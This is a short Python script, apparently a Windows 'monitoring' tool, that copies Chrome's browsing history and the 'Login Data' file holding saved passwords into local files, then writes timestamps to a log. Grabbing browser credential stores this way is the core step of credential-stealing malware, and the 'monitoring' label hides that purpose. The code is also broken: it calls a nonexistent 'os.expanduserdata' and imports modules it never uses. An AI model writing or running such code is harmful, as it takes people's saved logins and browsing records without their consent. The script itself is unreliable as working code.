import os
import psutil
import winreg as reg
import datetime
import shutil

def get_chrome_history():
    history_path = os.path.expanduserdata('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History'
    if os.path.exists(history_path):
        shutil.copy2(history_path, 'chrome_history.txt')
        print("Chrome history copied.")
    else:
        print("Chrome history file not found.")

def get_chrome_passwords():
    password_path = os.path.expanduserdata('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    if os.path.exists(password_path):
        shutil.copy2(password_path, 'chrome_passwords.sqlite')
        print("Chrome passwords copied.")
    else:
        print("Chrome passwords file not found.")

def log_to_file(message):
    with open('system_artifacts.log', 'a') as log_file:
        log_file.write(f"{datetime.datetime.now()}: {message}\n")

def monitor():
    log_to_file("Monitoring started.")
    get_chrome_history()
    get_chrome_passwords()
    log_to_file("Monitoring completed.")

if __name__ == "__main__":
    monitor()